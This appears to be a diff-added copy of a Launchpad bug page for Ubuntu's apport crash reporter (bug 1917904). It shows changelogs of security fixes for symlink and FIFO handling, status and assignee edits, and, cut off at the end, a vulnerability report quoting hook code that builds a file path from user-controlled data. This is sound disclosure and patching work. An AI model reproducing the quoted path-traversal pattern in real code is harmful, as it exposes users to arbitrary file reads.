+      file isn't a FIFO in process_report().
+    - CVE-2021-32557
+
+ -- Marc Deslauriers &lt;marc.deslauriers@ubuntu.com&gt;  Tue, 18 May 2021 09:15:10 -0400</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Groovy): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/32" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-25T16:45:41.242357+00:00" title="2021-05-25 16:45:41 UTC">on 2021-05-25</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/32"> #32</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apport - 2.20.11-<wbr />0ubuntu27.<wbr />18</p>
+<p>---------------<br />
+apport (2.20.11-<wbr />0ubuntu27.<wbr />18) focal-security; urgency=medium</p>
+<p>&nbsp;&nbsp;* SECURITY UPDATE: Multiple arbitrary file reads (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- apport/<wbr />hookutils.<wbr />py: don&#x27;t follow symlinks and make sure the file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isn&#x27;t a FIFO in read_file().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- test/test_<wbr />hookutils.<wbr />py: added symlink tests.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32555<br />
+&nbsp;&nbsp;* SECURITY UPDATE: info disclosure via modified config files spoofing<br />
+&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- backends/<wbr />packaging-<wbr />apt-dpkg.<wbr />py: properly terminate arguments in<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get_<wbr />modified_<wbr />conffiles.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32556<br />
+&nbsp;&nbsp;* SECURITY UPDATE: arbitrary file write (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- data/whoopsie-<wbr />upload-<wbr />all: don&#x27;t follow symlinks and make sure the<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file isn&#x27;t a FIFO in process_report().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32557</p>
+<p>&nbsp;-- Marc Deslauriers &lt;email address hidden&gt;  Tue, 18 May 2021 09:15:10 -0400</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">This bug was fixed in the package apport - 2.20.11-0ubuntu27.18
+
+---------------
+apport (2.20.11-0ubuntu27.18) focal-security; urgency=medium
+
+  * SECURITY UPDATE: Multiple arbitrary file reads (LP: #1917904)
+    - apport/hookutils.py: don't follow symlinks and make sure the file
+      isn't a FIFO in read_file().
+    - test/test_hookutils.py: added symlink tests.
+    - CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,
+      CVE-2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,
+      CVE-2021-32555
+  * SECURITY UPDATE: info disclosure via modified config files spoofing
+    (LP: #1917904)
+    - backends/packaging-apt-dpkg.py: properly terminate arguments in
+      get_modified_conffiles.
+    - CVE-2021-32556
+  * SECURITY UPDATE: arbitrary file write (LP: #1917904)
+    - data/whoopsie-upload-all: don't follow symlinks and make sure the
+      file isn't a FIFO in process_report().
+    - CVE-2021-32557
+
+ -- Marc Deslauriers &lt;marc.deslauriers@ubuntu.com&gt;  Tue, 18 May 2021 09:15:10 -0400</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Focal): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+    
+    <time title="2021-05-25 19:31:31 UTC" datetime="2021-05-25T19:31:31.128064+00:00">on 2021-05-25</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Private Security &#8594; Public Security
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+    
+    <time title="2021-05-25 19:50:44 UTC" datetime="2021-05-25T19:50:44.589288+00:00">on 2021-05-25</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Public Security &#8594; Private Security
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/33" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-26T00:45:21.214155+00:00" title="2021-05-26 00:45:21 UTC">on 2021-05-26</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/33"> #33</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apport - 2.20.11-0ubuntu67</p>
+<p>---------------<br />
+apport (2.20.11-0ubuntu67) impish; urgency=medium</p>
+<p>&nbsp;&nbsp;* SECURITY UPDATE: Multiple arbitrary file reads (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- apport/<wbr />hookutils.<wbr />py: don&#x27;t follow symlinks and make sure the file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isn&#x27;t a FIFO in read_file().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- test/test_<wbr />hookutils.<wbr />py: added symlink tests.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32555<br />
+&nbsp;&nbsp;* SECURITY UPDATE: info disclosure via modified config files spoofing<br />
+&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- backends/<wbr />packaging-<wbr />apt-dpkg.<wbr />py: properly terminate arguments in<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get_<wbr />modified_<wbr />conffiles.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32556<br />
+&nbsp;&nbsp;* SECURITY UPDATE: arbitrary file write (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- data/whoopsie-<wbr />upload-<wbr />all: don&#x27;t follow symlinks and make sure the<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file isn&#x27;t a FIFO in process_report().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32557</p>
+<p>&nbsp;-- Marc Deslauriers &lt;email address hidden&gt;  Tue, 18 May 2021 09:15:10 -0400</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">This bug was fixed in the package apport - 2.20.11-0ubuntu67
+
+---------------
+apport (2.20.11-0ubuntu67) impish; urgency=medium
+
+  * SECURITY UPDATE: Multiple arbitrary file reads (LP: #1917904)
+    - apport/hookutils.py: don't follow symlinks and make sure the file
+      isn't a FIFO in read_file().
+    - test/test_hookutils.py: added symlink tests.
+    - CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,
+      CVE-2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,
+      CVE-2021-32555
+  * SECURITY UPDATE: info disclosure via modified config files spoofing
+    (LP: #1917904)
+    - backends/packaging-apt-dpkg.py: properly terminate arguments in
+      get_modified_conffiles.
+    - CVE-2021-32556
+  * SECURITY UPDATE: arbitrary file write (LP: #1917904)
+    - data/whoopsie-upload-all: don't follow symlinks and make sure the
+      file isn't a FIFO in process_report().
+    - CVE-2021-32557
+
+ -- Marc Deslauriers &lt;marc.deslauriers@ubuntu.com&gt;  Tue, 18 May 2021 09:15:10 -0400</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Impish): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~seth-arnold" class="sprite person">Seth Arnold (seth-arnold)</a>
+    
+    <time title="2021-06-12 00:47:53 UTC" datetime="2021-06-12T00:47:53.035757+00:00">on 2021-06-12</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Private Security &#8594; Public Security
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~evansanita713" class="sprite person">SatoshiNakamoto (evansanita713)</a>
+    
+    <time title="2021-06-19 21:59:37 UTC" datetime="2021-06-19T21:59:37.085361+00:00">on 2021-06-19</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Bionic): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; SatoshiNakamoto (evansanita713)
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+    
+    <time title="2021-06-19 22:15:54 UTC" datetime="2021-06-19T22:15:54.202732+00:00">on 2021-06-19</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Bionic): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        SatoshiNakamoto (evansanita713) &#8594; nobody
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~evansanita713" class="sprite person">SatoshiNakamoto (evansanita713)</a>
+    
+    <time title="2021-06-19 22:28:07 UTC" datetime="2021-06-19T22:28:07.083829+00:00">on 2021-06-19</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Bionic): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; SatoshiNakamoto (evansanita713)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Focal): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; SatoshiNakamoto (evansanita713)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Groovy): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; SatoshiNakamoto (evansanita713)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Hirsute): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; SatoshiNakamoto (evansanita713)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Impish): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; SatoshiNakamoto (evansanita713)
+      </td>
+    </tr>
+  
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Public Security &#8594; Private Security
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+    
+    <time title="2021-06-19 23:06:56 UTC" datetime="2021-06-19T23:06:56.492062+00:00">on 2021-06-19</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Bionic): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        SatoshiNakamoto (evansanita713) &#8594; nobody
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Focal): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        SatoshiNakamoto (evansanita713) &#8594; nobody
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Groovy): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        SatoshiNakamoto (evansanita713) &#8594; nobody
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Hirsute): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        SatoshiNakamoto (evansanita713) &#8594; nobody
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Impish): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        SatoshiNakamoto (evansanita713) &#8594; nobody
+      </td>
+    </tr>
+  
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Private Security &#8594; Public Security
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~evansanita713" class="sprite person">SatoshiNakamoto (evansanita713)</a>
+    
+    <time title="2021-06-30 01:14:56 UTC" datetime="2021-06-30T01:14:56.058499+00:00">on 2021-06-30</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Impish): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; SatoshiNakamoto (evansanita713)
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+    
+    <time title="2021-06-30 01:42:25 UTC" datetime="2021-06-30T01:42:25.189420+00:00">on 2021-06-30</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Impish): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        SatoshiNakamoto (evansanita713) &#8594; nobody
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        <div style="float: right;">
+          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+activity">See full activity log</a>
+        </div>
+        <div class="clearfix"></div>
+
+        
+          
+
+          
+            <div align="center" id="add-comment-login-first">
+              To post a comment you must <a href="+login?comments=all">log in</a>.
+            </div>
+          
+        
+        
+      
+
+      </div><!-- class="top-portlet" -->
+      </div><!--- id="maincontentsub"-->
+      <div>
+        <div id="duplicate-form-container"></div>
+        <div id="privacy-form-container"></div>
+      </div>
+    </div>
+            
+            
+          </div><!-- yui-b -->
+        </div><!-- yui-main -->
+
+        
+          <div id="side-portlets" class="yui-b side">
+            
+      <div id="involvement" class="portlet">
+        <ul class="involvement">
+          <li class="single">
+            <a class="sprite bugs" href="/ubuntu/+source/apport/+filebug">
+              Report a bug
+            </a>
+          </li>
+        </ul>
+      </div>
+      <div id="privacy" class="first portlet public">
+  <div id="privacy-text">
+     <span id="information-type-summary" class="sprite public">This report contains
+         <strong id="information-type">Public Security</strong>
+         information
+     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/ubuntu/+source/apport/+bug/1917904/+secrecy">Edit</a>
+
+     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
+</div>
+  </div>
+</div>
+
+      <div id="portlet-actions" class="portlet vertical">
+  <ul id="duplicate-actions">
+    <li class="sprite bug-dupe">
+    <span id="mark-duplicate-text">
+    <a class="menu-link-mark-dupe" href="/ubuntu/+source/apport/+bug/1917904/+duplicate">Mark as duplicate</a>
+    </span>
+    </li>
+    
+    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+create-question">Convert to a question</a></li>
+    
+    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+addbranch">Link a related branch</a></li>
+    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
+    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+unlinkcve">Remove CVE link</a></li>
+  </ul>
+</div>
+
+      
+
+      <div class="portlet vertical" id="portlet-subscription">
+  <div class="section">
+    <div id="current_user_subscription" class="False">
+      
+        <span>You are</span>
+        
+        <a class="menu-link-subscription sprite modify edit" href="/ubuntu/+source/apport/+bug/1917904/+subscribe">
+           
+           
+           
+           not directly subscribed to this bug's notifications.
+        </a>
+      
+      
+    </div>
+    <div id="sub-unsub-spinner">Subscribing...</div>
+    <ul>
+      
+      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
+    </ul>
+  </div>
+  <script type="text/javascript">
+    LPJS.use('io-base', 'node',
+            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
+        Y.on('domready', function() {
+            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
+        });
+    });
+  </script>
+</div>
+
+      <div class="portlet vertical" id="portlet-subscribers">
+  <h2>Other bug subscribers</h2>
+  <div>
+    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
+  </div>
+  <div id="other-bug-subscribers"></div>
+</div>
+
+      
+
+      
+
+      
+  <div class="portlet" id="portlet-patches">
+    <h2>Patches</h2>
+    <ul>
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497170/+files/apport_2.20.11-0ubuntu65.1.debdiff">proposed hirsute debdiff</a>
+        <small>
+          (<a href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497170">edit</a>)
+        </small>
+      </li>
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497171/+files/apport_2.20.11-0ubuntu50.7.debdiff">proposed groovy debdiff</a>
+        <small>
+          (<a href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497171">edit</a>)
+        </small>
+      </li>
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497172/+files/apport_2.20.11-0ubuntu27.18.debdiff">proposed focal debdiff</a>
+        <small>
+          (<a href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497172">edit</a>)
+        </small>
+      </li>
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+attachment/5497173/+files/apport_2.20.9-0ubuntu7.24.debdiff">proposed bionic debdiff</a>
+        <small>
+          (<a href="/ubuntu/+source/apport/+bug/1917904/+attachment/5497173">edit</a>)
+        </small>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        <a class="sprite add" href="/ubuntu/+source/apport/+bug/1917904/+addcomment?field.patch=on">Add patch</a>
+      </li>
+    </ul>
+  </div>
+  
+
+
+      
+
+    
+          </div><!-- yui-b side -->
+        
+      </div><!-- yui-t4 -->
+
+      
+  <div id="footer" class="footer">
+    <div class="lp-arcana">
+        <div class="lp-branding">
+          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
+          &nbsp;&bull;&nbsp;
+          <a href="https://launchpad.net/+tour">Take the tour</a>
+          &nbsp;&bull;&nbsp;
+          <a href="https://help.launchpad.net/">Read the guide</a>
+          &nbsp;
+          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
+            <input type="search" id="search-text" name="field.text" />
+            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
+          </form>
+        </div>
+        
+  
+
+    </div>
+
+    <div class="colophon">
+      &copy; 2004-2021
+      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
+      &nbsp;&bull;&nbsp;
+      <a href="https://launchpad.net/legal">Terms of use</a>
+      &nbsp;&bull;&nbsp;
+      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
+      &nbsp;&bull;&nbsp;
+      <a href="/feedback">Contact Launchpad Support</a>
+      
+      &nbsp;&bull;&nbsp;
+      <a href="http://blog.launchpad.net/">Blog</a>
+      
+	&nbsp;&bull;&nbsp;
+	<a href="https://canonical.com/careers">Careers</a>
+      
+      &nbsp;&bull;&nbsp;
+      <a href="https://twitter.com/launchpadstatus">System status</a>
+      <span id="lp-version">
+      &nbsp;&bull;&nbsp;
+        r0d8de2b
+        
+        
+        (<a href="https://dev.launchpad.net/">Get the code!</a>)
+      </span>
+    </div>
+  </div>
+
+    </div><!-- yui-d0-->
+
+    
+  
+  
+  <script id="json-cache-script">LP.cache = {"initial_comment_batch_offset": 41, "first visible_recent_comment": -7, "related_features": {}, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1917904", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1917904"}, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1917904", "web_link": "https://bugs.launchpad.net/bugs/1917904", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1917904, "private": false, "information_type": "Public Security", "name": null, "title": "Arbitrary file reads", "description": "# Vulnerabilities in Apport\nDuring a cursory code review, several potential security issues in `apport` and crash-related hooks in packages such as `Xorg` and `openjdk-14-lts` have been identified.\n\nWhile the issue regarding the `openjdk-14-lts` package is exploitable\non default installations, the remaining issues most likely are mitigated by the sysctl setting `fs.protected_symlinks` on default Ubuntu installations.\n\nWith regard to issues mitigated by `fs.protected_symlinks`, it is not clear if they are considered to be part of the threat model, but nonetheless will be included in this report. Further, if the issues regarding package hooks should be reported in the corresponding packages' bug tracker, please let me know.\n\n## Issue 1: Arbitrary file read in package-hooks/source_openjdk-*.py\nThe `add_info()` function allows for a directory traversal by building a file path using user-controlled data without properly sanitizing the resulting path.\n\n```Python\ndef add_info(report, ui=None):\n\u00a0\u00a0\u00a0\u00a0if report['ProblemType'] == 'Crash' and 'ProcCwd' in report:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# attach hs_err_\u003cpid\u003e.pid file\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cwd = report['ProcCwd']\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pid_line = re.search(\"Pid:\\t(.*)\\n\", report[\"ProcStatus\"])\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if pid_line:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pid = pid_line.groups()[0]\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0path = \"%s/hs_err_pid%s.log\" % 